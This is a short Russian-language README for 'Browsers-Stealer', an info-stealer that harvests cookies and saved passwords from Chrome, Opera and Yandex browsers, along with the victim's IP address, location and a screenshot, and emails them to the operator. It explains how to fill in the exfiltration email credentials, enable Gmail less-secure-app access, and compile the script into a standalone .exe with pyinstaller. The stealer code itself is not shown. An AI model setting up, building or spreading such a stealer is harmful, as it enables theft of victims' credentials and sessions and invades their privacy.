# Browsers-Stealer
Стиллер для куки и паролей браузеров Google Chrome, Opera, Yandex. Так же сохраняет IP пользователя, местополежние и скрин экрана. Все это приходит архивом на указанную почту
## Настройка
Заполняем поля файла Stealer.py:
```
sender = "" - почта с которой будет отправляться архив с результатом
receiver = "" - почта на которю будет приходить архив
password = "" - пароль от почты "sender"
```

Переходим [сюда](https://myaccount.google.com/lesssecureapps), авторизовавшись с почты "sender" и разрешаем доступ
## Компиляция
Чтобы собрать все в .exe файл используем команду:
```
pyinstaller -F --hidden-import=pkg_resources.py2_warn Stealer.py
```
